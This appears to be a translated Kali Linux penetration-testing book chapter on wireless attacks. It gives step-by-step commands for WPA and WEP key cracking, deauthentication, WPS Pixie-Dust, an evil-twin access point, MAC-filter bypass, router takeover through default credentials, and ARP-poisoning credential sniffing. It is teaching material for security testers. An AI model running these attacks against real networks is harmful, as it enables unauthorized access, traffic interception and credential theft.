![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f0002a72-7680-4b0d-93ef-0095d7fb22bb.png)

现在我们将使用`airodump-ng`命令来识别我们的目标网络。输入以下命令：

```
    # airodump-ng wlan0mon  
```

`airodump-ng`会一直运行，直到你停止它。一旦看到目标网络，按下*Ctrl* + *C*来停止。你会看到以下输出。我们已经用红色标识出了我们要尝试破解的网络：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/99fc1e78-500b-4e63-987b-3b67631702b3.png)

1.  上一步为我们确定了三个关键信息。首先，我们确定了我们的目标网络`Aircrack_Wifi`。其次，我们有了 BSSID，即目标网络的 MAC 地址`44:94:FC:37:10:6E`，最后，信道号`6`。下一步是捕获与我们的目标接入点之间的无线流量。我们的目标是捕获四次握手。要开始捕获流量，输入以下命令到命令提示符中：

```
    # - airodump-ng wlan0mon -c 6 --bssid 44:94:FC:37:10:6E -w wificrack  
```

该命令告诉`airodump-ng`使用监视接口来捕获目标网络的 BSSID 和信道的流量。以下截图显示了命令的输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ff3bbc97-b086-4c61-bb2d-b5ad833199cb.png)

当命令运行时，我们要确保捕获到握手。如果客户端连接并获得有效的握手，命令输出会显示已捕获到握手：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ab123482-4e71-47ee-9664-d06555dea13b.png)

如果无法获得 WPA 握手，查看是否有客户端访问网络。在这种情况下，我们看到一个连接到目标无线网络的站点，MAC 地址为`64:A5:C3:DA:30:DC`。由于这个设备已经认证，它很可能在连接暂时丢失时自动重新连接。在这种情况下，我们可以在命令行中输入以下命令：

```
    # aireplay-ng -0 3  -a 44:94:FC:37:10:6E - c 64:A5:C3:DA:30:DC  wlan0mon 
```

`aireplay-ng`命令允许我们向通信流中注入数据包并取消客户端的认证。然后，这将迫使客户端完成一个我们可以捕获的新的 WPA 握手。

1.  在我们捕获到握手后，我们通过按下*Ctrl* + *C*来停止`airodump-ng`。如果我们检查根文件夹，我们会看到从我们的转储中创建的四个文件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/304decfd-c197-464a-8aff-fb29e0e1fa0d.png)

我们可以在 Wireshark 中检查`wificrack-01.cap`文件。如果我们深入到 EAPOL 协议，我们实际上可以看到我们捕获到的四路握手：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/da1d297a-1856-424c-b220-e37db5b15198.png)

进一步的检查显示了特定的 WPA 密钥 Nonce 及其相关信息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d2b90d0c-7cef-4958-a8f5-2b78aa56b721.png)

1.  我们有必要的信息来尝试破解 WPA 预共享密钥。为此，我们使用`aircrack-ng`工具。以下是`aircrack-ng`命令：

```
        #aircrack-ng -w rockyou.txt -b 44:94:FC:37:10:6E wificrack-01.cap

```

在前面的命令中，我们使用`-b`选项标识目标网络的 BSSID。然后，我们指向捕获文件`wificrack-01.cap`。最后，我们使用一个单词列表，就像我们会破解密码文件一样。在这种情况下，我们将使用`rockyou.txt`单词列表。一旦命令设置好，按*Enter*，`aircrack-ng`就会开始工作：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/d5f7e6ad-1587-45ec-b00a-5421099b810c.png)

Aircrack-ng 将利用`rockyou.txt`密码列表并尝试对捕获文件进行每种组合。如果预共享密钥中使用的`passcode`在文件中，`aircrack-ng`将产生以下消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f27753ee-96d5-4e75-b4fb-c782c68bb75e.png)

从前面的截图中，我们可以看到`passcode "15SHOUTINGspiders"`在我们用于暴力破解的`rockyou.txt`文件中。还要注意，这大约花了一小时 42 分钟，最终尝试了总共 8,623,648 个不同的 passcodes。这种技术可以尝试使用任何密码列表，就像我们在密码破解章节中讨论的那样。只要记住，passcode 的长度可以是 8 到 63 个字符。可用的组合数量太多，无法尝试。不过，这种攻击对于易记或短密码短语是成功的，就像密码破解一样。

# WEP 破解

WEP 破解的过程与用于破解 WPA 的过程非常相似。识别目标网络，捕获流量（包括认证机制），然后指向一个暴力破解攻击以反向密钥。不过，也有一些不同之处。与 WPA 破解相反，我们只需要捕获四路握手，而在 WEP 破解中，我们必须确保收集足够的**初始化向量**（**IVs**）以正确破解 WEP 密钥。虽然这可能看起来很困难，但有技术可用来强制这个过程，并使得嗅探流量所需的时间尽可能短。

1.  为了开始 WEP 破解过程，我们以与 WPA 破解相同的方式将无线网卡置于监视模式。输入以下命令：

```
    # airmong-ng start wlan0
```

1.  我们尝试使用以下命令找到目标网络：

```
    # airodump-ng wlan0mon 
```

这产生了无线网络列表：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ef80c30e-8ba5-493a-baf8-edcbe6236195.png)

我们已经确定了一个使用 BSSID 为`C0:56:27:DB:30:41`的 WEP 目标网络。同样，我们需要记下这一点，以及接入点使用的频道，这种情况下是`11`频道。

1.  捕获目标无线网络的数据。在这里，我们将使用`airodump-ng`命令来捕获这些数据：

```
    # airodump-ng -c 11 -w belkincrack --bssid C0:56:27:DB:30:41

```

这个命令将`airdump-ng`指向我们目标网络的适当频道。此外，我们正在捕获写入`"belkincrack"`文件的流量。这个命令产生以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4ae32059-8e0f-42fd-870d-651187191b4b.png)

请注意，我们尚未看到任何数据通过该接入点移动。这很重要，因为我们需要捕获包含 IVs 的数据包，以便破解 WEP 密钥。

1.  我们必须伪装认证到我们的目标网络。基本上，我们使用一个名为`aireplay-ng`的 Aircrack-ng 工具告诉接入点我们有正确的 WEP 密钥，并且准备好进行认证。即使我们没有正确的密钥，以下命令也让我们伪装认证，并允许我们与 WEP 接入点进行通信：

```
      # aireplay-ng -1 0 -a C0:56:27:DB:30:41 wlan0mon
```

在上述命令中，我们让`aireplay-ng`使用`"-1"`伪装认证，`"0"`作为重传时间，`"-a"`作为目标接入点的 BSSID。该命令产生以下结果：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/5f3cb2a5-be14-4865-a72a-4c7c6e42b49a.png)

现在我们有能力与 WEP 接入点进行通信。

1.  正如我们在步骤 3 中看到的，通过该接入点来回传输的数据非常少。我们需要捕获大量数据，以确保我们能够抓住那些 IVs 并强制发生碰撞。我们可以再次使用`aireplay-ng`来增加数据到接入点。在以下命令中，我们将进行 ARP 请求重放攻击。在这种攻击中，我们将使用`aireplay-ng`向接入点重发 ARP 请求。每次这样做时，它都会生成一个新的 IV，增加我们强制发生碰撞的机会。打开第二个命令提示符，输入以下内容：

```
      # aireplay-ng -3 -b C0:56:27:DB:30:41 wlan0mon
```

在上述命令中，`"-3"`告诉`aireplay-ng`对以下网络进行 ARP 请求重放攻击，`"-b"`是特定接口`"wlanomon"`。命令运行后，您需要通过 ping 同一网络上的另一个主机来强制 ARP 请求。这将强制 ARP 请求。一旦开始，您将看到以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/59230ea0-4e8d-4068-93b0-b0c3e0960647.png)

如果我们回到第一个正在运行`airodump-ng`的命令提示符，我们会看到数据速率开始增加。在这种情况下，超过 16,000 个 IVs：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/6647269f-543b-4d7c-a067-fea572cfed1c.png)

1.  打开第三个终端。在这里，我们将开始 WEP 破解。这可以在`airodump-ng`命令捕获 IVs 的同时运行。要启动该过程，请输入以下命令：

```
    # aircrack-ng belkincrack-01.cap

```

在上述命令中，`aircrack-ng`指向正在运行的捕获文件。`aircrack-ng`立即开始工作，如截图所示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/2c9f43e3-2624-4583-b348-60b834a05f87.png)

`aircrack-ng`可能会指示 IVs 不足，并在 IVs 足够时重新尝试。正如我们在以下截图中看到的，`aircrack-ng`能够确定 WEP 密钥。总共捕获了 15,277 个 IVs，用于破解。此外，在不到三分钟内测试了 73253 个密钥：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/cb7d24c1-d1e7-401b-9978-695213dbb61e.png)

正如我们在这次攻击中看到的，通过正确数量的无线流量和`aircrack-ng`工具套件，我们能够确定 WEP 密钥，从而允许我们对网络进行认证。正是这种攻击的简易性导致了从 WEP 到 WPA 认证的转变。虽然由于这种攻击，WEP 网络在野外变得越来越少，但您仍然可能会遇到一些。如果您确实遇到它们，这种攻击非常适合向客户展示存在的重大安全漏洞。

# PixieWPS

PixieWPS 是一种离线暴力破解工具，用于破解 WPS 无线接入点的 PIN。PixieWPS 的名称来自 Dominique Bongard 发现的 Pixie-Dust 攻击。此漏洞允许对 WPS PIN 进行暴力破解。（有关此漏洞的更详细信息，请参阅 Bongard 的演示：[`passwordscon.org/wp-content/uploads/2014/08/Dominique_Bongard.pdf`](https://passwordscon.org/wp-content/uploads/2014/08/Dominique_Bongard.pdf)。）

要访问 PixieWPS，请在命令提示符中输入以下内容：

```
    # pixiewps
```

该命令将为您提供不同的命令选项。为了使 PixieWPS 正常工作，必须获取大量信息。这包括以下内容：

+   受训者公钥

+   注册公钥

+   受训者哈希-1

+   受训者哈希-2

+   认证会话密钥

+   受训者 nonce

由于需要所有这些组件，PixieWPS 通常作为另一个工具的一部分运行，比如 Wifite。

# Wifite

Wifite 是一个自动化的无线渗透测试工具，利用了与 Aircrack-ng、Reaver 和 PixieWPS 命令行工具相关的工具。

这使得 Wifite 能够捕获流量并反向验证 WEP、WPA 和 WPS 类型的无线网络的认证凭据。导航到应用程序|无线攻击|Wifite 或通过命令行启动 Wifite：

```
    # wifite
```

任一都会带您到初始屏幕：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4bdb099f-22fc-4b40-ac64-ba4d85cef47e.png)

Wifite 将自动将无线卡置于监视模式，然后开始扫描无线网络：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f78d12a6-0bc8-449c-942c-16d9d7be1770.png)

一旦在列表中看到目标网络，比如 ESSID 或广播 SSID Brenner，按下*Ctrl* + *C*。这时，您将被提示输入一个单个数字或一个测试范围。在这种情况下，我们输入数字`4`并按*Enter*：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/17d37599-ad2c-46fe-adef-47d18a499dc3.png)

Wifite 会自动通过捕获必要的信息来启动 WPS Pixie 攻击。如果成功，将显示以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ba7de24f-f539-4480-a400-4fb60fda8a5a.png)

如果存在 WPS 漏洞，就像这里的无线网络一样，Wifite 能够确定 WPA 密钥和 PIN。

# Fern Wifi-Cracker

Fern Wifi-Cracker 是一个用 Python 编写的基于 GUI 的工具，用于测试无线网络的安全性。目前有两个支持的版本：一个是付费的专业版本，具有更多的功能，另一个是免费版本，功能有限。Kali Linux 附带的版本需要`aircrack-ng`和其他无线工具才能正常运行。

要启动 Fern，您可以导航到应用程序|无线攻击|Fern Wifi Cracker，或者在命令提示符中键入以下内容：

```
    # fern-wifi-cracker
```

以下屏幕截图是加载的初始页面：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b29be887-c9fc-474e-b7cf-49a2641c92d0.png)

我们将使用 Fern Wifi Cracker 来攻击相同的无线网络 Aircrack-Wifi，利用 GUI 而不是使用命令行进行攻击：

1.  选择接口。单击“选择接口”下拉菜单。在这种情况下，我们将选择 wlan0。Fern 将自动将我们的接口置于监视模式：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/f68397a3-37ba-44d6-b68f-7e8787c1a9a8.png)

1.  单击“扫描访问点”按钮。Fern 将自动扫描天线范围内的无线网络。扫描完成后，Wifi WEP 和 WiFi WPA 按钮将从灰色变为彩色，表示检测到使用这些安全设置的无线访问点：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/03335b4a-7702-4a07-a09a-4f11e0d22872.png)

1.  单击 Wifi WPA 按钮会显示一个攻击面板，其中包含我们可以攻击的 WPA 无线访问点的图形表示。在这种情况下，我们将选择 Aircrack_Wifi 按钮！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/83f620b6-8ddb-4af1-abfb-b1725a4b359d.png)

1.  此屏幕提供了有关所选访问点的详细信息。此外，Fern Wifi Cracker 允许进行 WPA 攻击或 WPS 攻击。在这种情况下，我们将使用 WPA 攻击！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/c8335752-2280-48c1-82ec-769b4ba93e11.png)

1.  设置 Fern Wifi-Cracker 将用于反向密码的密码文件。在这种情况下，我们制作了一个特殊的 Wi-Fi 密码列表，并将 Fern Wifi-Cracker 指向该文本文件！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/b5271b9f-5995-44b3-be4d-198794ecd298.png)

1.  点击 Wifi 攻击按钮。Fern Wifi-Cracker 完成了我们之前在 Aircrack-ng 部分介绍的整个过程。这包括解认证客户端，然后捕获四次握手。最后，Fern Wifi-Cracker 将通过密码文件，并且如果密码文件中有该密码，将出现以下消息：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/cb49a80e-9301-4a30-9973-1fc4ab25db9f.png)

Fern Wifi-Cracker 负责破解 Wi-Fi 网络和接入点的后台工作。虽然使用这个工具可能更容易，但最好对 Aircrack-ng 的工作原理有一个扎实的理解。Fern Wifi-Cracker 和其他基于 GUI 的 Wi-Fi 破解程序都是基于 Aircrack-ng 的，对该工具集有扎实的理解可以让您完全理解这些程序背后发生了什么。

# 恶意双子攻击

在任何大城市或企业环境中几乎不可能找不到 Wi-Fi 信号。其中许多，特别是在公共场所，Wi-Fi 热点不需要身份验证，其他则会显示一个强制门户，可能只需要您接受一些条款和条件，或者要求您使用您的电子邮件或 Facebook 账户登录。

恶意双子攻击，也称为流氓接入点或虚假接入点，是一个伪装成合法接入点而没有所有者知识或同意的接入点。连接到合法接入点的终端用户将连接到虚假接入点，因为虚假接入点通常信号更强。

设置了虚假接入点的攻击者现在将能够捕获受密码保护的 SSID 的实际密码，为中间人和其他攻击做好准备。

我们需要包括 Aircrack Suite 和`dnsmasq`。dnsmasq 是一个小巧、轻量级的工具，可以作为易于配置的 DNS 转发器和 DHCP 服务器。根据您想要使用的攻击向量，您将需要一些额外的工具，比如`apache2`和`dnsspoof`：

1.  验证您是否拥有这些工具。我们知道 Aircrack 工具和 Apache2 已经预装在 Kali 上。在终端中，输入`apt-get install dnsmasq`。如果已经安装，您将无需进行任何操作；如果没有安装，系统将提示您进行安装确认。

1.  通过将无线适配器之一设置为监视模式`airmon-ng start <interface>`来确定目标网络，然后启动`airodump-ng <interface>`来开始列出当前正在广播的所有网络：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/0620d16c-acc6-4dec-8d62-da28ee9f42d5.png)

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/8a903d37-72fb-45e7-88a3-ff8cdb37d39b.png)

1.  您可能会看到类似于屏幕截图中的错误。在大多数情况下，这些错误是可以忽略的。如果遇到问题，使用`kill <PID>`来结束进程。例如，我会使用`kill 610`来结束`NetworkManager`进程：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/2209b3b4-d3c2-4d78-a17f-ae133e19be45.png)

注意目标网络的 BSSID（MAC 地址）、ESSID（广播名称、SSID）和信道。

1.  设置一个`dnsmasq`的配置文件。我在我的主目录下创建了一个名为`tmp`的文件夹，使用`mkdir tmp`。然后改变目录，在终端输入`touch dnsmasq.conf`。这将创建一个名为`dnsmasq`的文件。输入`nano dnsmasq.conf`将在`cli`的`nano`文本编辑器中打开`dnsmasq.conf`文件。输入以下行：

```
interface=<at0>
dhcp-range=10.0.0.10,10.0.0.250,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```

在`dnsmasq.conf`文件中，我们只指定了接口（`at0`）、要使用的`dhcp`范围（`10.0.0.10 - 10.0.0.250`，`12h`租约时间）、`dhcp-option=3`作为网关（`10.0.0.1`），以及`dhcp-option=3`作为 DNS 服务器（`10.0.0.1`）。为什么接口是`at0`？这是因为`airbase-ng`创建了一个名为`at0`的默认桥接口。

使用*Ctrl* + *O*在 nano 中保存更改，使用*Ctrl* + *X*退出。

1.  设置`airbase-ng`。这将创建我们的访问点。使用`airbase-ng -e <ESSID> -c <channel> <monitor interface>`进行设置。我的目标`ESSID`设置为`ARRIS-4BE2`，频道设置为`11`，监视接口为`wlan0mon`：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/9f50d5a8-29cb-4eb3-b6e0-ba639778b290.png)

1.  启用`at0`接口，稍微调整`iptables`，并启用/禁用流量通过。您可以像之前一样依次执行这些操作。

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/4d167000-68b1-495e-99a2-16393f2a3020.png)

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/a96ceae2-7b3f-408a-8df6-9eb20edc6642.png)

使用`dnsmasq -C <config file> -d`启动`dnsmasq`： 

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/2fea28c9-7885-478e-8903-caeb167e5a24.png)

1.  您可以阻止流量通过并像之前一样捕获 IVS（使用`echo 0 > /proc/sys/net/ipv4/ip_forward`），或者您可以向用户提供一个强制门户网站或允许流量通过（使用`echo 1 > /proc/sys/net/ipv4/ip_forward`），只重定向特定目标站点以设置 MitM 攻击。

在这里，我们可以朝着几个方向发展。我们可以继续并建立一个成熟的恶意双子（Rogue AP）以捕获网络的密码，或者我们可以建立一个中间人攻击，通过整合其他工具（如`dsniff`工具套件或`sslstrip`）或将其与**浏览器利用框架**（**BeEF**）结合起来，直接攻击客户端，劫持用户的浏览器。

# 破解后

如果您成功获取了 WPA 或 WEP 密钥，现在您有了认证到网络的能力。一旦连接到无线网络，您就拥有了我们在本书中讨论过的一系列工具。这是因为一旦得到适当的认证，您的 Kali Linux 安装就只是**局域网**（**LAN**）的一部分，就像我们通过网络电缆连接一样。因此，我们有能力扫描其他设备，利用漏洞，利用系统，并提升我们的凭据。

# MAC 欺骗

有一些技术对于演示我们可以探索的无线网络上的其他漏洞是有用的。其中一个问题是绕过一个称为 MAC 过滤的常见无线控制。MAC 过滤是一些路由器上的一种控制，只允许特定的 MAC 地址或 MAC 类型。例如，您可能正在测试一个使用 iPad 的商业位置。无线网络只会允许具有`34:12:98`前三个十六进制字符的 MAC 地址。其他组织可能有一组允许加入的 MAC 地址。

如果您能够破解 WPA 密钥，但发现无法加入网络，则目标组织可能正在使用某种形式的 MAC 地址过滤。为了绕过这一点，我们将使用 Macchanger 命令行工具。这个简单的命令允许我们将 MAC 地址更改为允许我们连接的内容。首先，您可以轻松地从以前的侦察和破解尝试中找到一个新的 MAC 地址。Airodump-ng 工具将识别连接到无线网络的客户端。此外，使用 Wireshark 解析捕获文件将允许您识别潜在有效的 MAC 地址。

在这个例子中，我们已经确定了一个连接到目标无线网络的无线客户端，其 MAC 地址为`34:12:98:B5:7E:D4`。要将我们的 MAC 地址更改为模拟合法的 MAC 地址，只需在命令行中输入以下内容：

```
    # macchanger -mac=34:12:98:B5:7E:D4 wlan0
```

该命令产生以下输出：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/7d5f9bd9-5ee5-4cbc-8ff0-7f1ec9534e26.png)

此外，如果我们运行`ifconfig wlan0`命令，我们可以看到我们伪造的 MAC 地址：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/630e2806-b851-471b-a3ba-e82418ce58cc.png)

现在我们有能力绕过接入点上正在进行的任何 MAC 过滤。现在有能力连接到无线网络。与我们能够破坏的任何系统一样，建立持久性是另一个关键步骤。这使我们有一定的确定性，如果我们失去连接，我们将能够再次访问系统。

# 持久性

一旦我们有有效的身份验证无线网络的方法并能够连接，下一步就是建立持久性。一个要关注的领域是无线路由器。大多数无线路由器都有基于 Web 的或其他控制台，合法管理员可以登录并管理路由器。通常，这些路由器位于我们连接的无线局域网子网的开头。例如，如果我们连接到`Wifi_Crack`并运行`ifconfig wlan0`命令，它会将我们标识为具有 IP 地址`10.0.0.7`。

如果我们通过 Iceweasel 浏览器导航到[`http://10.0.0.1`](http://10.0.0.1)，我们会被带到这个页面。您还可以在终端中输入`route -n`，这将给您默认网关：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/0cc31dca-b88e-4481-99f9-4ecb42d7b16e.png)

如果我们输入`admin`用户名而没有密码并单击确定，我们会得到这个：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/34822b7f-ba0a-4219-ad61-027f130531b1.png)

我们看到的是管理员帐户的默认密码。虽然不常见，但并非不可能，这个网络的系统管理员留下了无线路由器的默认凭据。如果我们没有收到这个错误消息，互联网上有大量资源汇总了各种路由器、交换机和无线接入点的默认管理员帐户。

一个这样的网站是[`www.routerpasswords.com/`](http://www.routerpasswords.com/)。如果这不起作用，下一个选择是使用我们之前介绍过的技术来暴力破解登录。

如果我们能够破坏管理员帐户并访问管理设置，注意允许您再次登录的信息，例如 WPS PIN：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/dc5fb669-f2af-4e55-a08e-eda43ddb344c.png)

管理员可能会更改无线接入点的 WPA 密码，但通常会保留 WPS PIN。此外，您应该检查是否有能力访问 MAC 地址过滤控件：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ee95fe48-fc11-4371-9ffe-6c7cf13b1d48.png)

从这里，您可以输入几个 MAC 地址，以便将来使用。

# 嗅探无线流量

在检查嗅探无线流量的技术时，有两种类型的技术可用。第一种是在经过身份验证并连接到目标无线局域网时嗅探无线局域网流量。在这种情况下，有能力利用中间人攻击与 Ettercap 等工具，将网络流量强制通过我们的测试机器。

第二种技术是嗅探我们可以从特定无线网络获取的所有无线流量，并使用 WPA 或 WEP 密码解密它。如果我们试图通过不连接到无线局域网来限制我们的足迹，这可能是必要的。通过被动嗅探流量并稍后解密，我们减少了被发现的机会。

# 嗅探无线局域网流量

就像有线局域网一样，在无线局域网上，我们有能力嗅探网络流量。以下嗅探技术要求您已经正确地经过身份验证连接到正在测试的无线网络，并从路由器那里收到了有效的 IP 地址。这种嗅探将利用 Ettercap 工具进行 ARP 欺骗攻击并嗅探凭据：

1.  通过转到应用程序|嗅探和欺骗|Ettercap-gui 或在命令提示符中输入`ettercap-gui`来启动 Ettercap。导航到 Sniff 并单击 Unified Sniffing。然后，您将看到一个网络接口的下拉列表。选择您的无线接口，在我们的情况下是 WLAN0:![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/6574cc02-2827-43a3-951f-245f4e7e1bc5.png)

1.  单击主机，然后单击扫描主机。扫描完成后，单击主机列表。如果是活动无线网络，您应该会看到一些主机。

1.  单击 MiTM，然后 ARP 毒化。在下一个屏幕上，选择一个 IP 地址，然后单击目标 1，然后选择第二个 IP 地址，然后单击目标 2:![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/7195b214-8690-4a5e-892d-7793afbfe40b.png)

1.  单击嗅探远程连接单选按钮，然后单击确定:![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/df1ce8c7-f483-4ccf-b9c1-c29e5c865430.png)

这将启动 ARP 毒化攻击，从而我们将能够看到我们选择的两个主机之间的所有流量。

1.  开始 Wireshark 捕获。当您被带到第一个屏幕时，确保选择无线接口，在这种情况下是 WLAN0:

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/949163e6-5ce3-4dab-8289-c12cf3c83776.png)

当您检查流量时，我们可以看到捕获的各种类型的流量。最显著的是我们两个主机之间打开的 Telnet 会话：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/83861a93-1904-49fa-bc3e-8e13e42ab078.png)

如果我们右键单击 Telnet 会话并选择跟踪 TCP 流，我们可以看到 Metasploitable 实例的 Telnet 凭据以明文形式显示：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/6c64a92d-e242-43c7-bc55-055bb5b695c3.png)

# 被动嗅探

在被动嗅探中，我们未经过网络认证。如果我们怀疑可能会触发入侵防范控制（如流氓主机检测）的可能性，这是一种避开这些控制但仍然可能获得潜在机密信息的好方法：

1.  在目标网络上被动扫描无线流量。确保您的无线网卡处于监视模式：

```
    # airmon-ng start wlan0  
```

1.  使用`airodump-ng`工具来嗅探网络流量，就像我们在 WPA 破解部分所做的那样：

```
    # airodump-ng wlan0mon -c 6 --bssid 44:94:FC:37:10:6E -w wificrack
```

1.  运行工具的时间长短由你决定。为了确保我们能够解密流量，我们需要确保捕获完整的四路握手，如果是 WPA 网络的话。一旦我们捕获到足够的流量，按下*Ctrl* + *C*。

1.  导航到捕获文件所在的文件夹，然后双击。这应该会自动在 Wireshark 中打开捕获！[](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/70f0c58a-fcd1-484b-bebf-bd79a78627a0.png)

捕获是加密的，只能看到一些`802.11`数据包。

1.  在 Wireshark 中，导航到编辑，然后到首选项。将打开一个新的窗口；单击协议旁边的三角形，然后单击 802.11\. 应该会打开以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/41dcd0ae-cedc-4cd1-b76b-5f69d4f1fe76.png)

1.  单击编辑。这将带您到一个屏幕，输入 WEP 或 WPA 解密密钥。单击新建。在密钥类型下，输入`WPA`，然后输入密码和 SSID。在这种情况下，它将是`Induction:Coherer`。单击应用和确定：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/443cb449-46f1-4d3d-b2f0-8c95d8db1f1c.png)

1.  要将此解密密钥应用于我们的捕获，导航到“查看”，然后到“无线工具栏”。启用无线工具栏。在主屏幕上，您将看到以下内容：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ad07a219-cb06-4db0-84d1-be6d5cdb6be9.png)

1.  在无线工具栏上，单击解密密钥。将会出现一个框。在左上角的下拉菜单中，选择 Wireshark 作为解密模式。确保选择适用的密钥。单击应用和确定：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/ca9f583f-6f78-4716-a8bc-e6cd97fdb5c3.png)

1.  Wireshark 将解密密钥应用于捕获，并在适用的情况下能够解密流量：

![](https://github.com/OpenDocCN/freelearn-kali-zh/raw/master/docs/kali18-asr-sec-pentest/img/71ef8191-1aac-4cb8-ac53-5ec2c9aec960.png)

正如前面的屏幕截图所示，我们可以解密我们捕获的流量，而无需加入网络。重申一点，这种技术需要为每个捕获的会话进行完整的四路握手。

# 摘要

无线网络的使用渗透到所有组织中。与迄今为止我们探讨过的任何系统一样，无线网络也存在漏洞。这些漏洞，无论是流量加密方式还是身份验证方法，都可以利用 Kali Linux 提供的工具。渗透测试人员演示这些漏洞及其相关的利用方式，可以让那些使用这些类型网络的人清楚地了解他们需要采取什么措施来保护自己免受攻击。随着世界向着越来越无线化的方向发展，智能手机、笔记本电脑和物联网的出现，无线网络及其安全控制的不断测试变得至关重要。

在下一章中，我们将讨论无线网络作为渗透测试的一个更大方法论的一部分：使用 Kali Linux 的 Nethunter 作为移动设备渗透测试平台。我们将以一种新的方式展示几种技术，使用一种灵活的渗透测试工具。
